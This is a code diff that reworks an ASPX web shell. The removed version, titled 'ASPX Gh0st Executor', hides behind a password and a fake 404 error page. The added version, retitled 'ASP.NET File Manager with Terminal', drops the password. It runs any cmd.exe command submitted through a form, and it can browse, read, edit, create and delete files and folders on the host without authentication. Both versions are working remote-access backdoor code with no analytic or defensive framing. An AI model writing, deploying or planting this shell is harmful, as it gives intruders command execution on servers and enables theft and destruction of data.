@@ -2,195 +2,461 @@
 <%@ Import Namespace="System.Diagnostics" %>
 <%@ Import Namespace="System.IO" %>
 
-<%
-    // yourwebsite.com/cmd.aspx?exec=ghost
-    string requiredPassword = "ghost";
-    string userPassword = Request.QueryString["exec"];
-
-    if (string.IsNullOrEmpty(userPassword) || userPassword != requiredPassword)
-    {
-        Response.Write(@"
-        <!DOCTYPE html>
-        <html>
-            <head>
-                <title>The resource cannot be found.</title>
-                <meta name='viewport' content='width=device-width' />
-                <style>
-                    body {font-family:'Verdana';font-weight:normal;font-size: .7em;color:black;} 
-                    p {font-family:'Verdana';font-weight:normal;color:black;margin-top: -5px}
-                    b {font-family:'Verdana';font-weight:bold;color:black;margin-top: -5px}
-                    H1 { font-family:'Verdana';font-weight:normal;font-size:18pt;color:red }
-                    H2 { font-family:'Verdana';font-weight:normal;font-size:14pt;color:maroon }
-                </style>
-            </head>
-            <body bgcolor='white'>
-                <span><H1>Server Error in '/' Application.<hr width=100% size=1 color=silver></H1>
-                <h2><i>The resource cannot be found.</i></h2></span>
-                <font face='Arial, Helvetica, Geneva, SunSans-Regular, sans-serif'>
-                <b> Description: </b>HTTP 404. The resource you are looking for (or one of its dependencies) could have been removed, had its name changed, or is temporarily unavailable. &nbsp;Please review the following URL and make sure that it is spelled correctly.
-                <br><br>
-                <b> Requested URL: </b>" + Request.Url.AbsolutePath + @"<br><br>
-                </font>
-            </body>
-        </html>");
-        Response.End();
-    }
-%>
-
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head runat="server">
-    <title>ASPX Gh0st Executor</title>
+    <title>ASP.NET File Manager with Terminal</title>
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/css/bootstrap.min.css" rel="stylesheet" />
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css" rel="stylesheet" />
     <style>
-        body { font-family: Arial, sans-serif; text-align: center; margin: 20px; }
-        textarea { width: 80%; height: 300px; }
-        .error { color: red; font-weight: bold; }
-        .success { color: green; font-weight: bold; }
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #ffffff;
+            color: #0000ff;
+            margin: 0;
+            padding: 0;
+        }
+        .container {
+            margin-top: 30px;
+        }
+        .error {
+            color: #e74c3c;
+            font-weight: bold;
+        }
+        .success {
+            color: #28a745;
+            font-weight: bold;
+        }
+        .file-list {
+            background-color: #f4f7fc;
+            padding: 20px;
+            border-radius: 12px;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.2);
+        }
+        .file-item {
+            margin-bottom: 15px;
+            display: flex;
+            align-items: center;
+            padding: 8px;
+            background-color: #e1ecf4;
+            border-radius: 5px;
+            margin: 5px 0;
+        }
+        .file-item a {
+            color: #007bff;
+            text-decoration: none;
+            font-size: 16px;
+            transition: color 0.3s;
+        }
+        .file-item a:hover {
+            color: #0000ff;
+            text-decoration: underline;
+        }
+        .file-icon {
+            margin-right: 10px;
+            font-size: 18px;
+        }
+        .file-folder {
+            color: #f39c12;
+        }
+        .file-file {
+            color: #3498db;
+        }
+        .terminal-output {
+            font-family: "Courier New", monospace;
+            background-color: #222;
+            color: #00FF00;
+            height: 300px;
+            overflow-y: auto;
+            padding: 10px;
+            border-radius: 5px;
+            margin-bottom: 20px;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.2);
+        }
+        .form-group input, .form-group textarea {
+            width: 100%;
+            padding: 12px;
+            margin-top: 10px;
+            background-color: #495057;
+            color: #f8f9fa;
+            border: 1px solid #343a40;
+            border-radius: 8px;
+        }
+        .btn {
+            margin-top: 10px;
+            padding: 12px 20px;
+            border-radius: 8px;
+            transition: background-color 0.3s ease;
+            font-size: 16px;
+        }
+        .btn-danger {
+            background-color: #e74c3c;
+            border-color: #c0392b;
+        }
+        .btn-info {
+            background-color: #17a2b8;
+            border-color: #138496;
+        }
+        .btn-primary {
+            background-color: #007bff;
+            border-color: #0056b3;
+        }
+        .btn-success {
+            background-color: #28a745;
+            border-color: #218838;
+        }
+        .btn:hover {
+            background-color: #555;
+        }
+        .btn-outline-light {
+            color: #ffffff;
+            border-color: #555;
+        }
+        
+        /* Modifikasi untuk membuat semua elemen sejajar ke bawah */
+        .file-manager-container {
+            display: flex;
+            flex-direction: column; /* Membuat elemen sejajar secara vertikal */
+            gap: 20px;
+        }
+
+        .file-manager-container > div {
+            background-color: #f4f7fc;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.2);
+        }
+        
+        .file-manager-container h3 {
+            font-size: 20px;
+            margin-bottom: 15px;
+            color: #0000ff;
+        }
+        
+        .pwd {
+            color: #00FF00;
+            font-weight: bold;
+        }
+        .back-button {
+            color: #00BFFF;
+            font-weight: bold;
+        }
+        .back-button:hover {
+            color: #ffffff;
+            text-decoration: underline;
+        }
+        .back-button-container {
+            margin-bottom: 10px;
+        }
     </style>
 </head>
 <body>
 
-    <h2>ASPX Gh0st Executor</h2>
-    <form method="get">
-        <input type="hidden" name="exec" value="<%= Server.HtmlEncode(userPassword) %>">
-        <input type="text" name="cmd" placeholder="Enter command..." value="<%= Request.QueryString["cmd"] %>">
-        <input type="submit" value="Execute">
-    </form>
+    <div class="container">
+        <h2 class="text-center text-success">ASP.NET File Manager with Terminal</h2>
 
-    <%
-        string workingDir = Server.MapPath("~/");
+        <!-- PWD Section (Current Directory) -->
+        <div class="back-button-container">
+            <a href="<%= Session["PreviousDirectory"] as string ?? Server.MapPath("~/") %>" class="back-button">🔙 Back to previous directory</a>
+        </div>
 
-        if (Session["CurrentDirectory"] != null)
-        {
-            workingDir = Session["CurrentDirectory"].ToString();
-        }
+        <div>
+            <h3 class="pwd">Current Directory (PWD):</h3>
+            <p class="pwd">
+                <% 
+                    string currentDirectory = Session["CurrentDirectory"] as string ?? Server.MapPath("~/");
+                    Response.Write(currentDirectory);
+                %>
+            </p>
+        </div>
 
-        string command = Request.QueryString["cmd"];
-        if (!string.IsNullOrEmpty(command))
-        {
-            try
-            {
-                // Sanitize and handle directory changes (prevent directory traversal)
-                if (command.ToLower().StartsWith("dir "))
-                {
-                    string newDir = command.Substring(4).Trim('"');
-                    if (Directory.Exists(newDir))
+        <!-- File Manager and Terminal Section -->
+        <div class="file-manager-container">
+            <!-- Terminal Section -->
+            <div class="terminal-container">
+                <h3>Terminal (Shell Command):</h3>
+                <form method="POST">
+                    <input type="text" name="cmd" placeholder="Enter shell command" class="form-control" autocomplete="off">
+                    <input type="submit" value="Execute" class="btn btn-primary mt-2">
+                </form>
+
+                <%
+                    if (Request.HttpMethod == "POST" && !string.IsNullOrEmpty(Request.Form["cmd"]))
                     {
-                        workingDir = newDir;
-                        Session["CurrentDirectory"] = workingDir;
+                        string command = Request.Form["cmd"];
+                        string output = "";
+                        string error = "";
+
+                        try
+                        {
+                            string cmdPath = @"C:\Windows\System32\cmd.exe";
+                            ProcessStartInfo psi = new ProcessStartInfo();
+                            psi.FileName = cmdPath;
+                            psi.Arguments = "/c " + command;
+                            psi.RedirectStandardOutput = true;
+                            psi.RedirectStandardError = true;
+                            psi.UseShellExecute = false;
+                            psi.CreateNoWindow = true;
+
+                            Process process = new Process();
+                            process.StartInfo = psi;
+                            process.Start();
+
+                            output = process.StandardOutput.ReadToEnd();
+                            error = process.StandardError.ReadToEnd();
+
+                            process.WaitForExit();
+
+                            if (!string.IsNullOrEmpty(error))
+                            {
+                                Response.Write("<p class='error'>Error: " + Server.HtmlEncode(error) + "</p>");
+                            }
+                            else
+                            {
+                                Response.Write("<p class='success'>Command Executed Successfully:</p>");
+                            }
+
+                            Response.Write("<pre class='terminal-output'>" + Server.HtmlEncode(output) + "</pre>");
+                        }
+                        catch (Exception ex)
+                        {
+                            Response.Write("<p class='error'>Error executing command: " + ex.Message + "</p>");
+                        }
                     }
-                }
+                %>
+            </div>
 
-                ProcessStartInfo psi = new ProcessStartInfo();
-                psi.FileName = "cmd.exe";
-                psi.Arguments = "/c " + command;
-                psi.WorkingDirectory = workingDir;
-                psi.RedirectStandardOutput = true;
-                psi.RedirectStandardError = true;
-                psi.UseShellExecute = false;
-                psi.CreateNoWindow = true;
+            <!-- File Management Section -->
+            <div class="file-manager">
+                <h3>Files and Folders:</h3>
+                <div class="file-list">
+                    <%
+                        string[] directories = Directory.GetDirectories(currentDirectory);
+                        string[] files = Directory.GetFiles(currentDirectory);
 
-                Process process = new Process();
-                process.StartInfo = psi;
-                process.Start();
+                        foreach (var dir in directories)
+                        {
+                            string dirName = Path.GetFileName(dir);
+                            Response.Write("<div class='file-item'><i class='fas fa-folder file-icon file-folder'></i><a href='?cd=" + Server.UrlEncode(dirName) + "'> Folder: " + dirName + "</a></div>");
+                        }
 
-                string output = process.StandardOutput.ReadToEnd();
-                string error = process.StandardError.ReadToEnd();
-                process.WaitForExit();
+                        foreach (var file in files)
+                        {
+                            string fileName = Path.GetFileName(file);
+                            Response.Write("<div class='file-item'><i class='fas fa-file file-icon file-file'></i><a href='?readFile=" + Server.UrlEncode(fileName) + "'> File: " + fileName + "</a></div>");
+                        }
+                    %>
+                </div>
+            </div>
+        </div>
 
-                if (!string.IsNullOrEmpty(error))
-                {
-                    Response.Write("<p class='error'>Error: " + Server.HtmlEncode(error) + "</p>");
-                }
-                else
-                {
-                    Response.Write("<p class='success'>Command Executed Successfully:</p>");
-                }
+        <!-- File Actions Section -->
+        <div class="file-manager-container">
+            <!-- Change Directory -->
+            <div>
+                <h3>Change Directory:</h3>
+                <form method="get" class="form-group">
+                    <input type="text" name="cd" class="form-control" placeholder="Enter folder name to change to..." size="50">
+                    <input type="submit" class="btn btn-info mt-2" value="Change Directory">
+                </form>
 
-                Response.Write("<textarea readonly>" + Server.HtmlEncode(output) + "</textarea>");
-            }
-            catch (Exception ex)
-            {
-                Response.Write("<p class='error'>Error: " + Server.HtmlEncode(ex.Message) + "</p>");
-            }
-        }
-    %>
+                <%
+                    if (!string.IsNullOrEmpty(Request.QueryString["cd"]))
+                    {
+                        string folderToChange = Request.QueryString["cd"];
+                        string newDirectory = Path.Combine(currentDirectory, folderToChange);
 
-    <hr>
-    <h2>Delete File / Folder</h2>
-    <form method="post">
-        <input type="hidden" name="exec" value="<%= Server.HtmlEncode(userPassword) %>">
-        <input type="text" name="deleteName" placeholder="Enter file or folder name..." size="50">
-        <input type="submit" value="Delete">
-    </form>
+                        if (Directory.Exists(newDirectory))
+                        {
+                            Session["CurrentDirectory"] = newDirectory; 
+                            Session["PreviousDirectory"] = currentDirectory;  // Store previous directory
+                            Response.Redirect(Request.Url.AbsolutePath);
+                        }
+                        else
+                        {
+                            Response.Write("<p class='error'>Directory not found: " + folderToChange + "</p>");
+                        }
+                    }
+                %>
+            </div>
 
-    <%
-        if (Request.HttpMethod == "POST" && !string.IsNullOrEmpty(Request.Form["deleteName"]))
-        {
-            string nameToDelete = Request.Form["deleteName"];
-            string targetPath = Path.Combine(workingDir, nameToDelete);
+            <!-- Edit File -->
+            <div>
+                <h3>Edit File:</h3>
+                <form method="get" class="form-group">
+                    <input type="text" name="editFile" class="form-control" placeholder="Enter file name to edit..." required size="50">
+                    <input type="submit" class="btn btn-warning mt-2" value="Edit File">
+                </form>
 
-            try
-            {
-                if (Directory.Exists(targetPath))
-                {
-                    Directory.Delete(targetPath, true);
-                    Response.Write("<p class='success'>Folder deleted successfully</p>");
-                }
-                else if (File.Exists(targetPath))
-                {
-                    File.Delete(targetPath);
-                    Response.Write("<p class='success'>File deleted successfully</p>");
-                }
-                else
-                {
-                    Response.Write("<p class='error'>File/Folder not found</p>");
-                }
-            }
-            catch (Exception ex)
-            {
-                Response.Write("<p class='error'>Error deleting: " + Server.HtmlEncode(ex.Message) + "</p>");
-            }
-        }
-    %>
+                <%
+                    if (!string.IsNullOrEmpty(Request.QueryString["editFile"]))
+                    {
+                        string fileName = Request.QueryString["editFile"];
+                        string filePath = Path.Combine(currentDirectory, fileName);
 
-    <hr>
-    <h2>Read File</h2>
-    <form method="get">
-        <input type="hidden" name="exec" value="<%= Server.HtmlEncode(userPassword) %>">
-        <input type="text" name="readFile" placeholder="Enter file name..." size="50">
-        <input type="submit" value="Read">
-    </form>
+                        if (File.Exists(filePath))
+                        {
+                            string fileContent = File.ReadAllText(filePath);
+                            Response.Write("<form method='post'><textarea name='editedContent' class='form-control' rows='10'>" + Server.HtmlEncode(fileContent) + "</textarea><br>");
+                            Response.Write("<input type='submit' class='btn btn-success' value='Save Changes'></form>");
+                        }
+                        else
+                        {
+                            Response.Write("<p class='error'>File not found: " + fileName + "</p>");
+                        }
+                    }
 
-    <%
-        if (!string.IsNullOrEmpty(Request.QueryString["readFile"]))
-        {
-            string fileToRead = Request.QueryString["readFile"];
-            string filePath = Path.Combine(workingDir, fileToRead);
+                    if (Request.HttpMethod == "POST" && !string.IsNullOrEmpty(Request.Form["editedContent"]))
+                    {
+                        string editedContent = Request.Form["editedContent"];
+                        string filePath = Path.Combine(currentDirectory, Request.QueryString["editFile"]);
 
-            if (File.Exists(filePath))
-            {
-                try
-                {
-                    string content = File.ReadAllText(filePath);
-                    Response.Write("<h3>File Content:</h3>");
-                    Response.Write("<textarea rows='10' cols='80' readonly>" + Server.HtmlEncode(content) + "</textarea>");
-                }
-                catch (UnauthorizedAccessException)
-                {
-                    Response.Write("<p class='error'>Permission Denied</p>");
-                }
-                catch (Exception ex)
-                {
-                    Response.Write("<p class='error'>Error reading file</p>");
-                }
-            }
-            else
-            {
-                Response.Write("<p class='error'>File not found</p>");
-            }
-        }
-    %>
+                        try
+                        {
+                            File.WriteAllText(filePath, editedContent);
+                            Response.Write("<p class='success'>File edited successfully: " + Request.QueryString["editFile"] + "</p>");
+                        }
+                        catch (Exception ex)
+                        {
+                            Response.Write("<p class='error'>Error editing file: " + ex.Message + "</p>");
+                        }
+                    }
+                %>
+            </div>
+
+            <!-- Create File -->
+            <div>
+                <h3>Create File:</h3>
+                <form method="post">
+                    <input type="text" name="fileName" class="form-control" placeholder="Enter file name..." required>
+                    <textarea name="fileContent" class="form-control" placeholder="Enter file content..." rows="5" required></textarea><br>
+                    <input type="submit" value="Create File" class="btn btn-success">
+                </form>
+
+                <%
+                    if (Request.HttpMethod == "POST" && !string.IsNullOrEmpty(Request.Form["fileName"]) && !string.IsNullOrEmpty(Request.Form["fileContent"]))
+                    {
+                        string fileName = Request.Form["fileName"];
+                        string fileContent = Request.Form["fileContent"];
+                        string filePath = Path.Combine(currentDirectory, fileName);
+
+                        try
+                        {
+                            File.WriteAllText(filePath, fileContent);
+                            Response.Write("<p class='success'>File created successfully: " + fileName + "</p>");
+                        }
+                        catch (Exception ex)
+                        {
+                            Response.Write("<p class='error'>Error creating file: " + ex.Message + "</p>");
+                        }
+                    }
+                %>
+            </div>
+
+            <!-- Create Folder -->
+            <div>
+                <h3>Create Folder:</h3>
+                <form method="post">
+                    <input type="text" name="folderName" class="form-control" placeholder="Enter folder name..." required>
+                    <input type="submit" value="Create Folder" class="btn btn-info">
+                </form>
+
+                <%
+                    if (Request.HttpMethod == "POST" && !string.IsNullOrEmpty(Request.Form["folderName"]))
+                    {
+                        string folderName = Request.Form["folderName"];
+                        string folderPath = Path.Combine(currentDirectory, folderName);
+
+                        try
+                        {
+                            if (!Directory.Exists(folderPath))
+                            {
+                                Directory.CreateDirectory(folderPath);
+                                Response.Write("<p class='success'>Folder created successfully: " + folderName + "</p>");
+                            }
+                            else
+                            {
+                                Response.Write("<p class='error'>Folder already exists: " + folderName + "</p>");
+                            }
+                        }
+                        catch (Exception ex)
+                        {
+                            Response.Write("<p class='error'>Error creating folder: " + ex.Message + "</p>");
+                        }
+                    }
+                %>
+            </div>
+
+            <!-- Delete File -->
+            <div>
+                <h3>Delete File:</h3>
+                <form method="post">
+                    <input type="text" name="deleteFile" class="form-control" placeholder="Enter file name to delete..." required>
+                    <input type="submit" value="Delete File" class="btn btn-danger">
+                </form>
+
+                <%
+                    if (Request.HttpMethod == "POST" && !string.IsNullOrEmpty(Request.Form["deleteFile"]))
+                    {
+                        string deleteFile = Request.Form["deleteFile"];
+                        string targetPath = Path.Combine(currentDirectory, deleteFile);
+
+                        if (File.Exists(targetPath))
+                        {
+                            try
+                            {
+                                File.Delete(targetPath);
+                                Response.Write("<p class='success'>File deleted successfully: " + deleteFile + "</p>");
+                            }
+                            catch (Exception ex)
+                            {
+                                Response.Write("<p class='error'>Error deleting file: " + ex.Message + "</p>");
+                            }
+                        }
+                        else
+                        {
+                            Response.Write("<p class='error'>File not found: " + deleteFile + "</p>");
+                        }
+                    }
+                %>
+            </div>
+
+            <!-- Delete Folder -->
+            <div>
+                <h3>Delete Folder:</h3>
+                <form method="post">
+                    <input type="text" name="deleteFolder" class="form-control" placeholder="Enter folder name to delete..." required>
+                    <input type="submit" value="Delete Folder" class="btn btn-danger">
+                </form>
+
+                <%
+                    if (Request.HttpMethod == "POST" && !string.IsNullOrEmpty(Request.Form["deleteFolder"]))
+                    {
+                        string deleteFolder = Request.Form["deleteFolder"];
+                        string targetPath = Path.Combine(currentDirectory, deleteFolder);
+
+                        if (Directory.Exists(targetPath))
+                        {
+                            try
+                            {
+                                Directory.Delete(targetPath, true);  // Delete folder and its contents
+                                Response.Write("<p class='success'>Folder deleted successfully: " + deleteFolder + "</p>");
+                            }
+                            catch (Exception ex)
+                            {
+                                Response.Write("<p class='error'>Error deleting folder: " + ex.Message + "</p>");
+                            }
+                        }
+                        else
+                        {
+                            Response.Write("<p class='error'>Folder not found: " + deleteFolder + "</p>");
+                        }
+                    }
+                %>
+            </div>
+
+        </div>
+    </div>
 
 </body>
 </html>
